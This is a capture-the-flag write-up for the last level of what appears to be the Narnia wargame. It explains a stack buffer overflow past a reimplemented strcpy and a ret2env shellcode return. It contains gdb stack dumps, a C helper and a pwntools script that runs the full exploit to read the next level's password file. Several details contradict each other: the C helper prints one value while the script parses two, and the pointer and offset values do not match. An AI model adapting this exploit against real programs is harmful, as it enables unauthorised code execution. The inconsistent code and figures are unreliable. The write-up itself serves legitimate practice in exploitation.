## 7 -> 8

### Writeup 

As fitting for the last in the challenge set, this level is the hardest.

In this level, we see that the developer has reimplemented `strcpy` (reading into a buffer until hitting a null terminator). The real challenge, however, is that the pointer to the user input is written over when the buffer is overflowed. This means that if we have 25 `A`s, only 21 of them get written before the pointer is altered and the program can no longer dereference the pointer to the user input.

To counter this, we need to include the address of the user input in the payload, such that we rewrite the same bytes into the space for the pointer. This way, we can continue to write to the memory after it, potentially changing the return address.

With the input of 20 `A`s, we can see this output:

```text
Breakpoint 1, 0x080491e7 in func ()
(gdb) info frame
Stack level 0, frame at 0xffffd354:
 eip = 0x080491e7 in func; saved eip = 0x08049201
 called by frame at 0xffffd360
 Arglist at 0xffffd34c, args:
 Locals at 0xffffd34c, Previous frame's sp is 0xffffd354
 Saved registers:
  ebp at 0xffffd34c, eip at 0xffffd350
(gdb) x/20wx $esp
0xffffd334: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd344: 0x41414141  0xffffd5af  0xffffd358  0x08049201
0xffffd354: 0x00000000  0xf7fd97f5  0x00000002  0xffffd424
0xffffd364: 0xffffd430  0x00000000  0xf7fa7e34  0x00000002
0xffffd374: 0xffffd424  0x0804908d  0xf7fa8420
(gdb)
```

The info frame reveals to us that the return address is `0x08049201`, stored in the stack at `0xffffd370`. This means our return address is stored 2 bytes after our buffer is stored; you can visibly confirm this by looking at the stack dump.

Originally, I assumed that the payload would then just be `20A + 0xffffd5af + 0xffffd358 + our code address`. However, since the user input grows, `0xffffd5af` (the user input pointer) changes and becomes `0xffffd5a3`, which we can confirm by looking at the stack before the user input gets copied, when we feed it a payload of 32 bytes. This is the first half of our payload.

Now that we know how to overwrite the return address, what should we write it to? Here we utilise a method called ret2env, where we store shellcode inside an environmental variable. Then we “return” to the environmental variable and the shellcode is run. This would make our final payload `20A + 0xffffd5af + 0xffffd358 + address of env shellcode`.

To achieve this, I wrote up a full script that carried out this process start to finish using the scripts below labelled `env_finder.c` and `env_shell.py`. 

<details>
  <summary>Flag</summary>No level after this :p
</details>

### Script

## env_finder.c
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
    printf("%p", argv[1], getenv(argv[1]));
}
```

## env_shell.py
```python
import subprocess
import os
from pwn import *

context.os = "linux"
context.bits = 32
context.arch = 'i386'

payload = shellcraft.cat("/etc/narnia_pass/narnia9")
shellcode = asm(payload)

env = os.environ.copy()
env["mmm_yummy_shell"] = shellcode.decode('latin-1')

p = subprocess.run(
    ["./env_finder", "mmm_yummy_shell"],
    env=env,
    capture_output=True,
    text=True
)
print(p)
print(p.stdout)

address = int(p.stdout.split(" ")[1], 16)
payload = b"".join([
    b"A" * 20,
    b"\xa3\xd5\xff\xff\x58\xd3\xff\xff",
    p32(address)
])
print(payload)

p = subprocess.run(
    ["/narnia/narnia8", payload],
    env=env,
    capture_output=True
)
print(p.stdout.decode('latin-1'))
```
